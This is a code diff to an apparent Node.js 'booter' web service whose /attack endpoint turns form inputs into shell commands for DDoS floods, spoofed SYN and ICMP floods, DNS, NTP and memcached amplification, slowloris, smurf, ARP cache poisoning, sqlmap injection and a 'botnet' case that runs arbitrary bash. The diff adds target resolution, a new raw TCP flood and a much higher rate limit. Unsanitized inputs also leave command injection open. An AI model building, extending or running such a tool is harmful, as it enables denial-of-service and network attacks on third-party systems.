@@ -10,6 +10,8 @@ const crypto = require('crypto');
 const promClient = require('prom-client');
 const { networkInterfaces } = require('os');
 const si = require('systeminformation');
+const dns = require('dns');
+const net = require('net');
 
 app.use(express.static('public'));
 app.use(express.urlencoded({ extended: true }));
@@ -50,11 +52,11 @@ const log = (message) => {
 };
 
 const apiLimiter = rateLimit({
-	windowMs: 15 * 60 * 1000,
-	max: 10000,
-	message: 'Too many requests, try again after 15 minutes',
-	standardHeaders: true,
-	legacyHeaders: false,
+    windowMs: 15 * 60 * 1000,
+    max: 100000,
+    message: 'Too many requests, try again after 15 minutes',
+    standardHeaders: true,
+    legacyHeaders: false,
 });
 
 app.use('/attack', apiLimiter);
@@ -126,8 +128,24 @@ app.get('/system-stats', async (req, res) => {
     res.json(stats);
 });
 
+function resolveTarget(target) {
+    return new Promise((resolve, reject) => {
+        if (net.isIP(target)) {
+            resolve(target);
+        } else {
+            dns.resolve4(target, (err, addresses) => {
+                if (err) {
+                    reject(err);
+                } else {
+                    resolve(addresses[0]);
+                }
+            });
+        }
+    });
+}
+
 app.post('/attack', async (req, res) => {
-    const target = req.body.target;
+    let target = req.body.target;
     const attackType = req.body.attackType;
     const duration = parseInt(req.body.duration) || 60;
     const intensity = parseInt(req.body.intensity) || 100;
@@ -146,10 +164,20 @@ app.post('/attack', async (req, res) => {
 
     let command = '';
     const numThreads = os.cpus().length * 8;
-    const encodedTarget = target;
+    let encodedTarget = target;
     const networkInterface = getNetworkInterface();
 
     attackIntensityGauge.set({ attackType: attackType, target: target }, intensity);
+
+    try {
+        if (!net.isIP(target)) {
+            target = await resolveTarget(target);
+            encodedTarget = target;
+        }
+    } catch (error) {
+        log(`Error resolving target: ${error.message}`);
+        return res.status(400).send(`Error resolving target: ${error.message}`);
+    }
 
     switch (attackType) {
         case 'ddos':
@@ -163,7 +191,7 @@ app.post('/attack', async (req, res) => {
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do nc -v ${encodedTarget} 80 & done; done"`;
             break;
         case 'tor_ddos':
-           try {
+            try {
                 const externalIp = await publicIp.v4();
                 log(`Attacker IP: ${externalIp}`);
                 command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do proxychains4 curl -A 'Noodles-Tor-DDoS' -s -o /dev/null ${encodedTarget} & done; done"`;
@@ -173,8 +201,8 @@ app.post('/attack', async (req, res) => {
             }
             break;
         case 'sql_inject':
-             command = `sqlmap --url "${encodedTarget}" --dbs --batch --level 5 --risk 3`;
-             break;
+            command = `sqlmap --url "${encodedTarget}" --dbs --batch --level 5 --risk 3`;
+            break;
         case 'slowloris':
             command = `timeout ${duration} perl slowloris.pl -dns ${encodedTarget} -port 80 -num ${intensity * 50}`;
             break;
@@ -192,8 +220,8 @@ app.post('/attack', async (req, res) => {
             break;
 
         case 'nuke':
-             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -s 65500 ${encodedTarget} & done; done"`;
-             break;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -s 65500 ${encodedTarget} & done; done"`;
+            break;
 
         case 'http_flood':
             command = `timeout ${duration} bash -c "while true; do wrk -t${numThreads} -c${intensity * 10} -d${duration} ${encodedTarget}; done"`;
@@ -204,45 +232,45 @@ app.post('/attack', async (req, res) => {
             break;
 
         case 'spoofed_flood':
-             const spoofedIp = generateRandomIP();
-             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p 80 -a ${spoofedIp} --flood ${encodedTarget} & done; done"`;
-             break;
+            const spoofedIp = generateRandomIP();
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p 80 -a ${spoofedIp} --flood ${encodedTarget} & done; done"`;
+            break;
 
         case 'icmp_flood':
-             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --flood --rand-source ${encodedTarget} & done; done"`;
-             break;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --flood --rand-source ${encodedTarget} & done; done"`;
+            break;
 
         case 'dns_amp':
-             const resolverIp = '8.8.8.8';
-             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do dig @${resolverIp} ${target} ANY +dnssec & done; done"`;
-             break;
+            const resolverIp = '8.8.8.8';
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do dig @${resolverIp} ${target} ANY +dnssec & done; done"`;
+            break;
 
         case 'memcached_amp':
-             const memcachedServer = '127.0.0.1:11211';
-             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -en '\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00get stats\\r\\n' | nc -u ${target} 11211 & done; done"`;
-             break;
+            const memcachedServer = '127.0.0.1:11211';
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -en '\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00get stats\\r\\n' | nc -u ${target} 11211 & done; done"`;
+            break;
 
         case 'ntp_amp':
-             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ntpq -n -c monlist ${target} & done; done"`;
-             break;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ntpq -n -c monlist ${target} & done; done"`;
+            break;
 
         case 'icmp_smurf':
-             const broadcastAddress = target.split('.').slice(0, 3).join('.') + '.255';
-             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --flood --rand-source -a ${target} ${broadcastAddress} & done; done"`;
-             break;
+            const broadcastAddress = target.split('.').slice(0, 3).join('.') + '.255';
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --flood --rand-source -a ${target} ${broadcastAddress} & done; done"`;
+            break;
 
         case 'arp_cache_poisoning':
-             if (!networkInterface) {
+            if (!networkInterface) {
                 log('Error: No suitable network interface found for ARP poisoning.');
                 return res.status(500).send('No suitable network interface found.');
             }
-             const gatewayIp = '192.168.1.1';
-             const victimIp = target;
-             const attackerMac = '00:11:22:33:44:55';
-             command = `timeout ${duration} bash -c "while true; do arpspoof -i ${networkInterface} -t ${victimIp} ${gatewayIp} & arpspoof -i ${networkInterface} -t ${gatewayIp} ${victimIp} & done"`;
-             break;
+            const gatewayIp = '192.168.1.1';
+            const victimIp = target;
+            const attackerMac = '00:11:22:33:44:55';
+            command = `timeout ${duration} bash -c "while true; do arpspoof -i ${networkInterface} -t ${victimIp} ${gatewayIp} & arpspoof -i ${networkInterface} -t ${gatewayIp} ${victimIp} & done"`;
+            break;
 
-         case 'slow_read':
+        case 'slow_read':
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do python3 slow_read.py ${encodedTarget} & done; done"`;
             break;
 
@@ -256,29 +284,38 @@ app.post('/attack', async (req, res) => {
                 log('Error: Payload is required for payload attack.');
                 return res.status(400).send('Payload is required for payload attack.');
             }
-             command = `timeout ${duration} bash -c "echo '${payload}' | nc ${encodedTarget} 80"`;
-             break;
+            command = `timeout ${duration} bash -c "echo '${payload}' | nc ${encodedTarget} 80"`;
+            break;
 
         case 'rudy':
-             command = `timeout ${duration} python3 rudy.py -t ${encodedTarget} -n ${numThreads} -s ${intensity}`;
-             break;
+            command = `timeout ${duration} python3 rudy.py -t ${encodedTarget} -n ${numThreads} -s ${intensity}`;
+            break;
 
         case 'goldeneye':
-             command = `timeout ${duration} python3 goldeneye.py ${encodedTarget} ${numThreads}`;
-             break;
+            command = `timeout ${duration} python3 goldeneye.py ${encodedTarget} ${numThreads}`;
+            break;
 
         case 'xerxes':
-             command = `timeout ${duration} ./xerxes ${encodedTarget} ${numThreads}`;
-             break;
+            command = `timeout ${duration} ./xerxes ${encodedTarget} ${numThreads}`;
+            break;
 
         case 'botnet':
-              const botCommand = req.body.botCommand;
-              if (!botCommand) {
+            const botCommand = req.body.botCommand;
+            if (!botCommand) {
                 log('Error: Bot command is required for botnet attack.');
-                 return res.status(400).send('Bot command is required for botnet attack.');
-              }
-              command = `timeout ${duration} bash -c "${botCommand}"`;
-              break;
+                return res.status(400).send('Bot command is required for botnet attack.');
+            }
+            command = `timeout ${duration} bash -c "${botCommand}"`;
+            break;
+            
+         case 'raw_tcp':
+            const rawPayload = req.body.rawPayload;
+            if (!rawPayload) {
+                log('Error: Raw TCP payload is required for raw_tcp attack.');
+                return res.status(400).send('Raw TCP payload is required for raw_tcp attack.');
+            }
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -ne '${rawPayload}' | nc ${encodedTarget} 80 & done; done"`;
+            break;
 
         default:
             log(`Error: Invalid attack type: ${attackType}`);
@@ -301,7 +338,7 @@ app.post('/attack', async (req, res) => {
             return res.status(500).send(`Attack failed: ${error.message}`);
         }
         if (stderr) {
-             log(`Attack stderr: ${stderr}`);
+            log(`Attack stderr: ${stderr}`);
         }
         log(`Attack completed. stdout: ${stdout}`);
         res.send('Attack initiated. Check logs for details.');
